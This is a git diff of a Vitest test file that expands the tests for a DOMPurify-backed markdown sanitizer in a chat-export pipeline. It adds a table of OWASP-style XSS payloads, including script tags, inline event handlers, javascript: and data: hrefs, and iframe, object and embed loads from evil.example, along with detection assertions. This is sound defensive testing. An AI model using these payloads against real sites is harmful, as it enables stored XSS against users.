@@ -1,4 +1,4 @@
-import { describe, expect, it } from "vitest";
+import { describe, expect, it, test } from "vitest";
 import {
   astToHTML,
   cleanMarkdownSyntax,
@@ -455,21 +455,113 @@ More text.`;
 // ─── markdownToHTMLSafe (DOMPurify-backed sanitizer) ───────────────────
 // These assertions exercise the REAL sanitizer (no mocks) — the chat-export
 // pipeline writes this output to a static HTML file recipients open directly,
-// so a sanitization regression here would mean stored XSS.
+// with no server CSP applied. Stored XSS here is the highest-impact bug class
+// in the export path, so the suite covers the full vector list (scripts,
+// inline handlers, javascript: hrefs, embedded objects, SVG handlers, mixed
+// case bypasses, data hrefs) — not just whichever payload the author had top
+// of mind. Each `test.each` row is a known-bad payload from the OWASP XSS
+// filter evasion cheat-sheet adapted for markdown input.
 describe("markdownToHTMLSafe", () => {
-  it("strips raw <script> tags so they cannot execute in the rendered file", () => {
-    const result = markdownToHTMLSafe("<script>alert(1)</script>");
-    // DOMPurify removes the script element entirely; the literal opening tag
-    // must not survive in any form (escaped text is also fine — what we
-    // forbid is `<script` appearing as a real tag start).
-    expect(result).not.toContain("<script");
+  /**
+   * Single source of truth: anything in the rendered output that would
+   * actually execute JS in a browser opening the static file. We assert on
+   * substrings that *only* appear when the dangerous form survived
+   * sanitisation — escaped text like `&lt;script&gt;` is acceptable because
+   * the browser renders it as inert text, not a tag.
+   */
+  function assertInert(result: string): void {
+    const lower = result.toLowerCase();
+    // Real `<script` tag start (escaped `&lt;script` is fine).
+    expect(lower).not.toMatch(/<script[\s>/]/);
+    // Inline event handlers — `on…=` attribute form. The leading space/
+    // quote/tab matters: `iconfont` contains `on` but isn't an event handler.
+    expect(lower).not.toMatch(/[\s"'`]on[a-z]+\s*=/);
+    // `javascript:` scheme in any attribute value. DOMPurify normalises
+    // entity-encoded variants, so a single check catches them all.
+    expect(lower).not.toContain("javascript:");
+    // Tags that load remote content with no inline-script-CSP backstop.
+    expect(lower).not.toMatch(/<iframe[\s>]/);
+    expect(lower).not.toMatch(/<object[\s>]/);
+    expect(lower).not.toMatch(/<embed[\s>]/);
+    // The literal payload the test fires — if any vector smuggled it into
+    // an executable position the assertions above missed, this catches it.
     expect(result).not.toContain("alert(1)");
+    expect(result).not.toContain("alert(\"xss\")");
+  }
+
+  test.each([
+    ["raw <script>", "<script>alert(1)</script>"],
+    ["mixed-case <ScRiPt>", "<ScRiPt>alert(1)</ScRiPt>"],
+    [
+      "nested split tag (defeats single-pass strip)",
+      "<scr<script>ipt>alert(1)</scr</script>ipt>",
+    ],
+    ["<script src=remote>", '<script src="https://evil.example/x.js"></script>'],
+    ["img with onerror", "<img src=x onerror=alert(1)>"],
+    ["img with onerror (quoted)", '<img src="x" onerror="alert(1)">'],
+    ["body with onload", "<body onload=alert(1)>"],
+    ["details with ontoggle", "<details ontoggle=alert(1) open>x</details>"],
+    ["a with onclick", '<a href="#" onclick="alert(1)">click</a>'],
+    ["a with javascript: href", '<a href="javascript:alert(1)">click</a>'],
+    [
+      "a with javascript: href (mixed case)",
+      '<a href="JaVaScRiPt:alert(1)">click</a>',
+    ],
+    [
+      "a with javascript: href (entity-encoded colon)",
+      '<a href="javascript&#58;alert(1)">click</a>',
+    ],
+    [
+      "a with data: html href",
+      '<a href="data:text/html,<script>alert(1)</script>">click</a>',
+    ],
+    ["iframe element", '<iframe src="https://evil.example"></iframe>'],
+    [
+      "iframe with javascript src",
+      '<iframe src="javascript:alert(1)"></iframe>',
+    ],
+    ["object element", '<object data="https://evil.example/x.swf"></object>'],
+    ["embed element", '<embed src="https://evil.example/x.swf">'],
+    ["svg with onload", '<svg onload="alert(1)"><circle r="10"/></svg>'],
+    [
+      "svg with embedded script",
+      "<svg><script>alert(1)</script></svg>",
+    ],
+    ["form action javascript:", '<form action="javascript:alert(1)"><button>x</button></form>'],
+    ['style with expression', '<style>body { background: url("javascript:alert(1)"); }</style>'],
+    [
+      "markdown link with javascript: href",
+      "[click me](javascript:alert(1))",
+    ],
+    [
+      "markdown link with mixed-case javascript: href",
+      "[click me](JaVaScRiPt:alert(1))",
+    ],
+  ])("neutralises XSS payload: %s", (_label, payload) => {
+    assertInert(markdownToHTMLSafe(payload));
   });
 
-  it("removes inline event handlers like onerror from img tags", () => {
-    const result = markdownToHTMLSafe("<img src=x onerror=alert(1)>");
-    // The img element may pass through; the onerror handler must not.
-    expect(result.toLowerCase()).not.toContain("onerror");
+  it("preserves benign markdown content alongside sanitisation", () => {
+    // A regression that over-sanitises (e.g. dropping every <a>) would still
+    // pass `assertInert`, so explicitly assert that legitimate content
+    // survives. Also pins the sanitiser's effect on safe constructs so a
+    // future config change that breaks plain-text rendering is caught.
+    const result = markdownToHTMLSafe("# Hello\n\n**bold** and a [link](https://example.com)");
+    expect(result).toContain("<h1");
+    expect(result).toContain("Hello");
+    expect(result).toContain("<strong>bold</strong>");
+    expect(result).toContain('href="https://example.com"');
+    expect(result).toContain(">link</a>");
+  });
+
+  it("preserves text content of stripped script tags as harmless text", () => {
+    // DOMPurify removes the <script> wrapper but does not invent new behavior
+    // for the textContent. The assertion is paranoid: if a future change
+    // started leaving the script element in place, both halves would fail.
+    const result = markdownToHTMLSafe("<script>alert(1)</script>");
+    expect(result.toLowerCase()).not.toMatch(/<script[\s>/]/);
+    // The literal `alert(1)` substring should not survive in any context
+    // because DOMPurify drops the wrapper *and* its text content.
     expect(result).not.toContain("alert(1)");
   });
 });
